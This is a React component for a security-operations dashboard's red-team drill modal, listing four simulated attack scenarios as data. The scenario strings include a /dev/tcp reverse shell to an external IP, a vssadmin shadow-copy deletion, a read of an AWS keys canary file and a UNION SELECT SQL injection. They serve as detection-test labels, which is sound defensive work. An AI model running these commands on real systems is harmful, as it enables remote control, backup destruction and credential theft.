/**
 * AttackSimulatorModal.jsx — Red Team Attack Drill & Chaos Simulator
 *
 * Allows analysts to launch simulated attack vectors to test detection rules,
 * the 3D Holographic Battle Globe, the Kill-Chain Graph, and Autonomous Autopilot.
 */
import { useState } from 'react';
import {
  Skull,
  Zap,
  Radio,
  Flame,
  ShieldAlert,
  Server,
  Terminal,
  Database,
  X,
  Play,
  CheckCircle2,
} from 'lucide-react';
import toast from 'react-hot-toast';
import { threatApi } from '@/services/api';
import { tacticalAudio } from '@/utils/tacticalAudio';

const DRILL_SCENARIOS = [
  {
    id: 'ransomware',
    title: 'Ransomware Outbreak & Shadow Copy Wipe',
    type: 'Ransomware Activity',
    severity: 'critical',
    ip: '185.193.65.19',
    country: 'Russia',
    city: 'Moscow',
    isp: 'Rostelecom AS12389',
    lat: 55.7558,
    lon: 37.6173,
    process: 'vssadmin.exe delete shadows /all /quiet',
    pid: 8821,
    description: 'Adversary initiated mass file encryption; attempted to destroy Volume Shadow Copies.',
    icon: Flame,
    color: 'text-red-400',
    border: 'border-red-800/60',
  },
  {
    id: 'c2_beacon',
    title: 'Remote C2 Reverse Shell Execution',
    type: 'command_injection',
    severity: 'critical',
    ip: '198.51.100.9',
    country: 'Netherlands',
    city: 'Amsterdam',
    isp: 'Leaseweb Global BV',
    lat: 52.3676,
    lon: 4.9041,
    process: 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1',
    pid: 4921,
    description: 'Interactive reverse shell connection established to external command and control server.',
    icon: Terminal,
    color: 'text-orange-400',
    border: 'border-orange-800/60',
  },
  {
    id: 'honeytoken',
    title: 'Decoy Canary Honeytoken Tripwire Breached',
    type: 'honeytoken_breached',
    severity: 'critical',
    ip: '198.51.100.42',
    country: 'Germany',
    city: 'Frankfurt',
    isp: 'Hetzner Online GmbH',
    lat: 50.1109,
    lon: 8.6821,
    process: 'cat ~/.eye/canary_aws_keys.env',
    pid: 6140,
    description: 'Host honeypot tripwire accessed by unknown script attempting credential theft.',
    icon: Zap,
    color: 'text-cyan-400',
    border: 'border-cyan-800/60',
  },
  {
    id: 'sqli',
    title: 'SQL Injection Database Exfiltration',
    type: 'SQL Injection Attempt',
    severity: 'high',
    ip: '203.0.113.45',
    country: 'China',
    city: 'Shanghai',
    isp: 'China Telecom Backbone',
    lat: 31.2304,
    lon: 121.4737,
    process: 'curl "http://internal/api?id=1 UNION SELECT null,passwordHash FROM users--"',
    pid: 3310,
    description: 'Automated database extraction payload targeting public API endpoints.',
    icon: Database,
    color: 'text-amber-400',
    border: 'border-amber-800/60',
  },
];

export default function AttackSimulatorModal({ isOpen, onClose, onLaunchDrill }) {
  const [selectedScenario, setSelectedScenario] = useState(DRILL_SCENARIOS[0]);
  const [launching, setLaunching] = useState(false);

  if (!isOpen) return null;

  const handleExecute = async () => {
    try {
      setLaunching(true);
      tacticalAudio.playAlarm();

      if (onLaunchDrill) {
        await onLaunchDrill(selectedScenario);
      }

      toast.success(`🚨 Red Team Drill Launched: ${selectedScenario.title}`, {
        duration: 4000,
      });

      onClose();
    } catch (err) {
      toast.error(`Drill simulation failed: ${err.message}`);
    } finally {
      setLaunching(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-md animate-fade-in">
      <div className="relative w-full max-w-xl bg-surface-900 border border-surface-700 rounded-xl shadow-2xl overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 border-b border-surface-700/80 bg-surface-800/50">
          <div className="flex items-center gap-2.5">
            <div className="p-1.5 rounded-lg bg-red-950/80 border border-red-800/60 text-red-400">
              <Skull className="w-5 h-5 animate-pulse" />
            </div>
            <div>
              <h2 className="text-sm font-bold text-slate-100 uppercase tracking-wide font-mono">
                Red Team Cyber Attack Simulator
              </h2>
              <p className="text-[11px] text-slate-400">
                Trigger real-time drills to test 3D Globe trajectories, the Kill-Chain graph, and SOAR Autopilot
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-lg hover:bg-surface-700 text-slate-400 hover:text-slate-200 transition-colors"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Drill Scenarios */}
        <div className="p-5 space-y-3">
          <label className="text-xs font-mono text-slate-400 uppercase tracking-wider font-semibold">
            Select Attack Vector Scenario:
          </label>

          <div className="space-y-2 max-h-[300px] overflow-y-auto pr-1">
            {DRILL_SCENARIOS.map((scenario) => {
              const isSelected = selectedScenario.id === scenario.id;
              const Icon = scenario.icon;
              return (
                <div
                  key={scenario.id}
                  onClick={() => setSelectedScenario(scenario)}
                  className={`p-3 rounded-lg border transition-all cursor-pointer ${
                    isSelected
                      ? `bg-surface-800/90 ${scenario.border} shadow-md`
                      : 'bg-surface-800/40 border-surface-700/60 hover:bg-surface-800/60'
                  }`}
                >
                  <div className="flex items-center justify-between mb-1">
                    <div className="flex items-center gap-2">
                      <Icon className={`w-4 h-4 ${scenario.color}`} />
                      <span className="text-xs font-semibold text-slate-200">{scenario.title}</span>
                    </div>
                    <span className="text-[10px] uppercase font-mono px-2 py-0.5 rounded bg-surface-900 border border-surface-700 text-slate-400">
                      {scenario.severity}
                    </span>
                  </div>
                  <p className="text-[11px] text-slate-400 pl-6 leading-relaxed">
                    {scenario.description}
                  </p>
                  <div className="pl-6 mt-1.5 flex items-center gap-3 font-mono text-[10px] text-slate-500">
                    <span>Origin: {scenario.city}, {scenario.country} ({scenario.ip})</span>
                    <span>Target PID: {scenario.pid}</span>
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Footer Actions */}
        <div className="flex items-center justify-between px-5 py-4 border-t border-surface-700/80 bg-surface-800/40">
          <span className="text-[11px] font-mono text-slate-500">
            ⚠️ Live telemetry event will be broadcasted to all connected SOC clients.
          </span>
          <div className="flex items-center gap-2">
            <button
              onClick={onClose}
              className="px-3 py-1.5 text-xs rounded-lg border border-surface-700 text-slate-400 hover:text-slate-200 transition-colors"
            >
              Cancel
            </button>
            <button
              onClick={handleExecute}
              disabled={launching}
              className="px-4 py-1.5 text-xs rounded-lg font-mono font-bold bg-red-700 hover:bg-red-600 text-white shadow-lg shadow-red-950/60 flex items-center gap-1.5 transition-all"
            >
              <Play className="w-3.5 h-3.5 fill-current" />
              <span>{launching ? 'Injecting Attack...' : 'Launch Attack Drill'}</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
